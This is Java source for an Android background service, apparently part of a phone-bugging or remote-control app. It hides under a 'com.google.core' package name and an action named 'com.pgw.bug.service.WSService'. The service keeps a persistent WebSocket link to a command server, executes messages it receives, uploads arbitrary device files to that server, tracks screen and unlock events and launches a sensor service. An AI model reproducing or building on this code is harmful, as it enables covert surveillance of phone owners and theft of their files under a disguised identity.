package com.google.core.service;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;
import java.nio.channels.NotYetConnectedException;
import java.util.Arrays;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft;
import org.java_websocket.drafts.Draft_17;
import org.java_websocket.handshake.ServerHandshake;

import com.baidu.location.f;
import com.google.core.domain.MsgType;
import com.google.core.msgpro.MsgPro;
import com.google.core.receiver.ScreenReceiver;
import com.google.core.utils.JsonUtils;
import com.google.core.utils.MsgUtils;
import com.google.core.utils.PhoneUtils;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class WsService extends Service {
	private class Receiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			int type = intent.getExtras().getInt("type");
			if (type == MsgType.SEND) {
				// 转发信息
				String msg = intent.getExtras().getString("msg");
					if (wClient != null && wClient.getReadyState()==1 ) {
						if (msg != null ) {
							wClient.send(msg);
						}
					}else{
						connect();
					}
			} else if (type == MsgType.CONNECTION) {
				// 启动WebSocket
				connect();
			} else if (type == MsgType.FILE_UPLOAD) {
				// 文件上传
				String filePath = intent.getExtras().getString("filePath");
				if (filePath != null)
					fileUpload(filePath);
			}
		}

	}

	public static final String ACTION = "com.pgw.bug.service.WSService";
	private static final int PORT = 8888;
	private static  String server_ip = "192.168.1.101";
	private static String TAG = "WebSocketService";

	/**
	 * 合并两个Byte数组
	 * 
	 * @param b1
	 *            第一个数组
	 * @param b2
	 *            第二个数组
	 * @return 合并后的新数组
	 */
	public static byte[] mergeByteArray(byte[] b1, byte[] b2) {
		byte[] temp = new byte[b1.length + b2.length];
		System.arraycopy(b1, 0, temp, 0, b1.length);
		System.arraycopy(b2, 0, temp, b1.length, b2.length);
		return temp;
	}

	private FileInputStream fis;
	private String msg;
	private MsgPro msgPro;
	private Receiver receiver;

	private SharedPreferences sp;

	private WebSocketClient wClient;
	private BroadcastReceiver screenReceiver;

	private void connect() {

		NetworkInfo netInfo = PhoneUtils
				.getNetworkInfo(getApplicationContext());
		if (netInfo != null && netInfo.isAvailable()) {
			if (wClient==null || wClient.getReadyState()!=1) {
				initWebSocket();
				wClient.connect();
			}
		}else{
//			Toast.makeText(getApplicationContext(),"网络不可用，请打开网络！" , 1).show();
			throw new RuntimeException("网络不可用，请打开网络！");
		}
		
	}

	/**
	 * 上传文件
	 * 
	 * @param path
	 */
	@SuppressLint("NewApi")
	public void fileUpload(String path) {

		try {
			if (path == null || path.trim().equals(""))
				return;
			File file = new File(path);
			if (!file.exists()) {
				throw new RuntimeException("上传文件不存在！");
			}
			// 1.将文件名转换为byte数组，已1024的大小放在信息头
			byte[] bFileName = Arrays.copyOf(file.getName().getBytes(), 1024);
			fis = new FileInputStream(file);
			// 2.将文件内容读入数组
			byte[] bFileData = new byte[new Long(file.length()).intValue()];
			fis.read(bFileData);
			// 3.将两个数组合并
			byte[] data = mergeByteArray(bFileName, bFileData);
			// 4.发送数组给服务器
			wClient.send(data);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				// 5.关闭输入流
				if (fis != null)
					fis.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

	}

	/**
	 * 初始化WebSocket
	 */
	private void initWebSocket() {
		sp = getSharedPreferences("config", 0);
		server_ip = sp.getString("server_ip", server_ip);
		String uri = "ws://" + server_ip + ":" + PORT;
		Log.v(TAG, uri);
		// 如果WebSocket不等于空则关闭
		if (wClient != null) {
			wClient.close();
			wClient = null;
		}
		try {
			// 创建WebSocket
			wClient = new WebSocketClient(new URI(uri), new Draft_17()) {
				@Override
				public void onClose(int arg0, String arg1, boolean arg2) {
					Log.v(TAG, "onClose");
				}

				@Override
				public void onError(Exception ex) {
					Log.v(TAG, "onError");
					ex.printStackTrace();
				}

				@Override
				public void onMessage(String msg) {
					Log.v(TAG, "onMessage");
					msgPro.doPro(msg);
				}

				@Override
				public void onOpen(ServerHandshake arg0) {
					Log.v(TAG, "onOpen");
					String userName = getSharedPreferences("config", 0)
							.getString("username", "aa");
					MsgUtils.sendToAdmin(WsService.this, MsgType.LOGIN, userName);
				}

			};
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		Log.v(TAG, "onCreate");
		// 注册广播接收器
		receiver = new Receiver();
		IntentFilter intentFilter = new IntentFilter();
		intentFilter.addAction(ACTION);
		registerReceiver(receiver, intentFilter);
//		注册屏幕广播接收器
		IntentFilter filter=new IntentFilter();
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_USER_PRESENT);
		screenReceiver=new ScreenReceiver();
		registerReceiver(screenReceiver, filter);

		msgPro=new MsgPro(getApplicationContext());

		// 启动呢SensorService
		startService(new Intent(getApplicationContext(), SensorService.class));
		super.onCreate();

	}

	@Override
	public void onDestroy() {
		Log.v(TAG, "onDestroy");
		// 解除广播接收器
		unregisterReceiver(receiver);
		unregisterReceiver(screenReceiver);
		// 关闭WebSocket
		wClient.close();
		// 停止SensorService
		stopService(new Intent(getApplicationContext(), SensorService.class));
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.v(TAG, "onStartCommand");
		connect();
		return START_STICKY;
	}

}
